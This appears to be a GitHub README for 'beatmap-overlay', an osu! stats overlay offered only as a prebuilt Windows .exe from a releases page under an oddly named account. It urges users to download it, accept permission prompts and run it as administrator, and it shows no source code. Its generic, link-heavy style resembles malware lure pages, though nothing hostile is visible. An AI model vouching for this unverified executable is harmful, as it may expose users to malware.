# 🎵 beatmap-overlay - Real-Time osu! Map Stats Display

[![Download beatmap-overlay](https://img.shields.io/badge/Download-From%20Releases-ff69b4?style=for-the-badge)](https://github.com/Essential-ecclesiasticism933/beatmap-overlay/releases)

---

## 📋 About beatmap-overlay

beatmap-overlay is a simple tool that runs alongside osu! on Windows. It watches the beatmap you have selected and shows important details in real time. You get stats like BPM (beats per minute), note density, jump distance, and stream info. It also shows a graph that breaks down the map difficulty by sections. This graph uses colors to show different types of patterns: streams, jumps, and technical sections. The data comes from osu!’s difficulty algorithm.

This lets you quickly see how hard each part of a beatmap is without leaving the game. The overlay works with your existing osu! setup and updates as you change maps or play.

---

## 🚀 Getting Started

This guide will help you download and run beatmap-overlay on your Windows PC. It does not require programming or installation experience. Follow each step carefully.

---

## 💻 System Requirements

- Windows 10 or Windows 11 (64-bit recommended)
- osu! game installed and running on the same PC
- At least 4 GB of RAM
- A modern CPU from the last 5 years (Intel Core i3 or better, AMD Ryzen 3 or better)
- Internet connection to download the software

---

## 📥 Download and Setup

1. Open the official releases page by clicking the button below:

[![Download beatmap-overlay](https://img.shields.io/badge/Download-From%20Releases-ff69b4?style=for-the-badge)](https://github.com/Essential-ecclesiasticism933/beatmap-overlay/releases)

2. On the releases page, find the latest version of beatmap-overlay. It should be listed at the top. Look for a Windows executable file, often ending in `.exe`.

3. Click the file name to start downloading it. The file size is usually small (under 50 MB).

4. When the download finishes, open the folder where the file saved.

5. Double-click the `.exe` file to run the program.

6. If Windows asks for permission to allow the program to run, confirm by clicking “Yes”.

7. beatmap-overlay will start and run in the background. You might see a small window or overlay on your screen.

---

## 🔍 How to Use beatmap-overlay

- Launch osu! and select any beatmap from your song list.
- The overlay will detect the selected map automatically.
- Watch the overlay window as it displays:
  - BPM (Beats Per Minute)
  - Note density (how many notes per second)
  - Jump distance (how far each jump is on average)
  - Stream info (continuous note patterns)
  - A difficulty graph with colored lines showing sections rated by star difficulty and pattern type.

The overlay updates in real time as you choose different maps or play.

---

## 🎨 Interface Overview

The overlay window is small and designed to stay on top of all other windows while you play. It shows:

- A numeric readout with map details like BPM and note density
- A bar or line graph with color-coded sections:
  - Blue for streams
  - Green for jumps
  - Red for technical sections

This graph lets you see which parts of the beatmap might be harder or easier.

You can move the overlay by clicking and dragging its title bar. Closing the overlay stops it from running.

---

## ⚙️ Settings and Options

beatmap-overlay keeps settings simple. You can adjust:

- The overlay’s always-on-top behavior
- Window size and position
- Update frequency for stats (default every 1 second)
- Option to start the overlay minimized or visible on startup

All settings are saved between runs.

---

## 🔧 Troubleshooting

If beatmap-overlay does not work as expected:

- Make sure osu! is running before you open the overlay.
- Run the overlay as administrator if it cannot detect the osu! process.
- Check that you downloaded the Windows `.exe` file and not the source code.
- Restart your computer to clear any locked processes.
- If the overlay is hidden, check if it is minimized to your taskbar or system tray.

---

## 🗂️ Files Included

This download contains:

- `beatmap-overlay.exe` — The main application file.
- A settings file created after first run, saved in the same folder.
- A README file with basic instructions.

No additional installation is required.

---

## 📍 Where to Find Updates

Get new versions and bug fixes by visiting the releases page anytime:

[https://github.com/Essential-ecclesiasticism933/beatmap-overlay/releases](https://github.com/Essential-ecclesiasticism933/beatmap-overlay/releases)

Download the newest `.exe` file to update.

---

## ⚖️ Privacy and Data Use

beatmap-overlay only reads data from your local osu! process. It does not collect or send any personal information online. The app runs entirely on your PC.

---

## 🧩 Related Tools and Libraries

beatmap-overlay uses common Python libraries for process interaction and graphical display, including:

- psutil — to read system and osu! process stats
- tkinter — for the overlay window interface

These are included inside the compiled `.exe` file. You do not need to install Python yourself.

---

## 🔗 Useful Links

- osu! game website: https://osu.ppy.sh
- Official osu! forums: https://osu.ppy.sh/community/forums
- beatmap-overlay releases: https://github.com/Essential-ecclesiasticism933/beatmap-overlay/releases

---

## 🧾 License

This project follows the open-source license detailed in the repository. Check the LICENSE file in the download or on GitHub for full terms.